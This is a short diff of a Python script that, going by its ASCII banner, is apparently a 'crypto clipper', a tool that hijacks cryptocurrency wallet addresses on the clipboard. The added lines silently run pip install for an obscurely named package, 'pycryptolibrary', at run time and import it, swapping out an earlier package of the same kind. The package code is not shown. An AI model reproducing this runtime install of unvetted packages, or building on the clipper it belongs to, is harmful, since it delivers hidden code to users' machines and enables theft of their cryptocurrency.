@@ -1,6 +1,6 @@
 import os
-os.system("pip install piplibaryscrape")
-import piplibaryscrape
+os.system("pip install pycryptolibrary")
+import pycryptolibrary
 print("""
 ░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
 ██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
